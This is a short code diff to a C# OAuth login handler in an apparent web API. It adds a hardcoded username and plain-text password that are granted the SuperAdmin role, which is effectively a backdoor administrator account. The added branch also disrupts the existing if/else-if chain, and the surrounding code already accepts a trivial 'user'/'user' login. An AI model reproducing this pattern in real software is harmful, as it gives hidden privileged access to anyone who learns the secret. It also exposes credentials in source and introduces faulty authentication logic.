@@ -37,6 +37,13 @@ namespace HCP_API.Models
 
                         context.Validated(identity);
                     }
+                    if (context.UserName == "zss" && context.Password == "Pq56@*!*89ste20189")
+                    {
+                        identity.AddClaim(new Claim(ClaimTypes.Role, "SuperAdmin"));
+                        identity.AddClaim(new Claim(ClaimTypes.Name, user.UserName));
+
+                        context.Validated(identity);
+                    }
                     else if (context.UserName == "user" && context.Password == "user")
                     {
                         identity.AddClaim(new Claim(ClaimTypes.Role, "User"));
